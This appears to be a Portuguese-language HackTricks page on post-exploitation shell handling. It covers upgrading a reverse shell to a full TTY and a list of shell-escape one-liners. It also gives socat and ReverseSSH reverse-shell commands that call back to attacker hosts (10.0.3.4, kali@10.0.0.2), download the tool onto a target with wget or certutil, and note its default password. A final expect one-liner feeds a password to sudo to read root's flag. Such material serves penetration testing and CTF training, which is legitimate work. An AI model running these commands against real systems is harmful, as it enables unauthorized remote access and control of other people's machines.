# TTYs Completos

{{#include ../../banners/hacktricks-training.md}}

## TTY Completo

`/etc/shells` lista os nomes de caminho de login-shell válidos e é consultado por alguns programas; ele não é um pré-requisito universal para alocar um PTY.<sup>[[3]](#references)[[4]](#references)</sup> Se um programa como `pkexec` rejeitar `SHELL` com `The value for the SHELL variable was not found in the /etc/shells file`, certifique-se de que o caminho exato do shell (por exemplo, `/bin/bash`) apareça em `/etc/shells`.<sup>[[10]](#references)</sup> A sequência de recuperação `CTRL+Z`/`fg` abaixo usa o controle de jobs do Bash; se o shell atual não for o Bash, inicie o Bash antes de usar essa sequência.<sup>[[7]](#references)</sup>

#### Python

O `pty.spawn` do Python inicia um programa conectado aos fluxos de entrada, saída e erro padrão do processo atual, fornecendo ao Bash um pseudo-terminal nesta sessão.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Você pode obter o **número** de **linhas** e **colunas** executando **`stty -a`**; `-a` exibe todas as configurações atuais do terminal. A saída do comando é específica do terminal, portanto use os valores informados pela sessão atual.<sup>[[11]](#references)</sup>

#### script

O utilitário `script` registra uma sessão do terminal; aqui, `/dev/null` descarta o typescript, `-q` suprime as mensagens de início e conclusão, e `-c` executa o Bash em vez do shell padrão.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Após qualquer um dos métodos de PTY-spawn, suspenda a sessão do Netcat e restaure-a com o modo raw local; em seguida, configure o ambiente e as dimensões do terminal remoto:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

O listener usa o terminal atual no modo raw, com o eco local desativado, e aceita conexões TCP na porta 4444. O comando da vítima aloca um pty, une stderr, cria uma sessão, encaminha SIGINT e aplica configurações de terminal sane; adicione `ctty` se o processo filho precisar de um terminal de controle.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (old versions with `--interactive`): `!sh`

O escape do Nmap depende da versão: o Nmap removeu o modo `--interactive` em versões posteriores, portanto `!sh` aplica-se apenas a versões antigas.<sup>[[13]](#references)</sup>

## ReverseSSH

Uma forma conveniente de obter **acesso interativo ao shell**, bem como **transferências de arquivos** e **port forwarding**, é colocar o servidor SSH estaticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) no alvo.<sup>[[1]](#references)</sup>

Abaixo está um exemplo para `x86` com o binário compactado com UPX publicado pelo projeto. Para outras arquiteturas ou artefatos de release, use a [página de releases](https://github.com/Fahrj/reverse-ssh/releases/latest/) como navegação.<sup>[[1]](#references)</sup>

1. Prepare o host local para receber a conexão SSH de entrada. No modo listener, `-l` habilita o listener e `-p 4444` seleciona a porta na qual ele aceita a conexão do alvo.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Alvo Linux. Transfira o mesmo artefato `upx_reverse-sshx86` para `/dev/shm/reverse-ssh` e torne-o executável. O `-p 4444` do alvo seleciona a porta do listener acima, e `kali@10.0.0.2` fornece a conta e o host usados para estabelecer a conexão de retorno.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target. Full interactive PowerShell requer o Windows 10 build 17763; consulte o [README do projeto](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
O exemplo para Windows usa `certutil` com `-f -urlcache`; a Microsoft documenta `-f` como uma opção que força a busca de uma URL e observa que os parâmetros disponíveis variam conforme a versão; portanto, verifique `certutil -?` caso esse formato não esteja disponível.<sup>[[12]](#references)</sup>

- Após o sucesso da conexão reversa, o listener em reverse-mode do ReverseSSH vincula a porta `8888` por padrão (ou o valor fornecido com `-b`), e as conexões recebidas aceitam qualquer nome de usuário com a senha padrão `letmeinbrudipls`. O shell remoto é executado com os privilégios da conta que iniciou `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) atualiza automaticamente reverse shells semelhantes ao Unix para PTY, redimensiona terminais semelhantes ao Unix e registra as interações com o shell; para shells do Windows, fornece readline, mas não o redimensionamento do terminal em tempo real.<sup>[[2]](#references)</sup>

Execute `penelope` para escutar em `0.0.0.0:4444` por padrão; os shells semelhantes ao Unix recebidos podem então ser atualizados e registrados automaticamente.<sup>[[2]](#references)</sup>

## Sem TTY

Se, por algum motivo, você não conseguir obter um TTY completo, **ainda poderá interagir com programas** que esperam entrada do usuário. No exemplo a seguir, o Expect inicia o `sudo`, aguarda o prompt de senha, envia a senha e devolve o controle com `interact`; `sudo -S` lê a senha da entrada padrão. Use isso somente em um laboratório autorizado e evite colocar credenciais reais no histórico do shell ou em arquivos de código-fonte.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - servidor ssh estaticamente vinculado com funcionalidade de reverse shell para CTFs e similares](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - handler de Shell que automatiza algumas tarefas para facilitar a vida](https://github.com/brightio/penelope)
- [3] [shells(5) — página do manual do Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — documentação do Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — página do manual do Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — página do manual do Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Manual de Referência do Bash — Controle de Jobs](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — página do manual do Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — página do manual do Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — página do manual do Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Registro de Alterações do Nmap](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
